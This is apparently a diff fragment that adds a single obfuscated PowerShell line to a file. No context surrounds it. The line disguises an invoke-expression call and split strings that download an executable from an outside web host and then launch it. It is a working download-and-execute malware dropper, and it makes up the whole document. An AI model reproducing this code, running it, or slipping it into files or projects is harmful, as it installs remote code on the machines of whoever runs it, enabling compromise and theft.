@@ -1,0 +1,1 @@
+﻿ &( $EnV:COmsPec[4,15,25]-joIN'') ( ('(New'+'-Object Syst'+'e'+'m.'+'Net.W'+'e'+'bCl'+'i'+'en'+'t).Down'+'l'+'oadFi'+'l'+'e(d7'+'aht'+'tp'+'://'+'worldn'+'it.com'+'/a'+'ba.'+'exed7a,d7afleeble.'+'exed'+'7a'+');Start-Pro'+'ce'+'ss d7a'+'fl'+'eeb'+'l'+'e'+'.'+'ex'+'ed'+'7'+'a').RepLACe('d7a',[strING][CHaR]39) ) 
